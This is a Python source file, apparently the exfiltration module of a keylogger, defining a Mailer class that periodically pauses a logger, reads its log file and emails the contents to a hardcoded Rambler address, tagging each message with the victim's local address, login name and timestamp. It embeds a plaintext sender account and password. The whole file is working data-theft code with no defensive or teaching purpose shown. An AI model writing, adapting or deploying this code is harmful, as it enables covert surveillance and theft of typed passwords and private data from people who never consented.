import smtplib
import threading
from email.mime.text import MIMEText
from get_local_addr import get_local_addr
import os
import time


class Mailer:

    # How frequent will the mail be sent in minutes
    freq = 45

    # Default mail addresses and passwords
    from_addr = 'spihv46879@rambler.ru'
    from_addr_pwd = 'goefganxsg'
    to_addr = 'qr5ig2shs0@rambler.ru'

    paused = False
    parent = None

    timer = None

    def __init__(self, parent, freq=45, from_addr='spihv46879@rambler.ru', from_addr_pwd='goefganxsg',
                 to_addr='qr5ig2shs0@rambler.ru'):

        # Sets instance variables to the ones passed
        self.freq = freq
        self.from_addr = from_addr
        self.from_addr_pwd = from_addr_pwd
        self.to_addr = to_addr
        self.parent = parent

        # Starts the new thread
        t = threading.Thread(target=self.start)
        t.daemon = False
        t.start()

    def start(self):

        # Starts the timer and calls send() every *freq* minutes
        self.timer = threading.Timer(self.freq * 60, self.send)
        self.timer.start()

    def send(self):
        if not self.paused:
            try:
                # Opens the gmail server and log-ins to the account
                server = smtplib.SMTP_SSL("smtp.rambler.ru", 465)
                server.login(self.from_addr, self.from_addr_pwd)

                # Pauses the logger, sends the file, unpauses logger
                self.parent.logger.pause()
                log = open(self.parent.logger.path, 'r')
                msg = MIMEText(log.read())
                msg['Subject'] = "-=[" + get_local_addr() + " " + os.getlogin() +\
                                 " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-"
                server.sendmail(self.from_addr, self.to_addr, msg.as_string())
                log.close()
                self.parent.logger.unpause()

                # Closes the connection
                server.close()

                self.start()
            except smtplib.SMTPException:
                self.start()

    def pause(self):
        self.timer.cancel()
        self.paused = True

    def unpause(self):
        self.paused = False
        self.start()
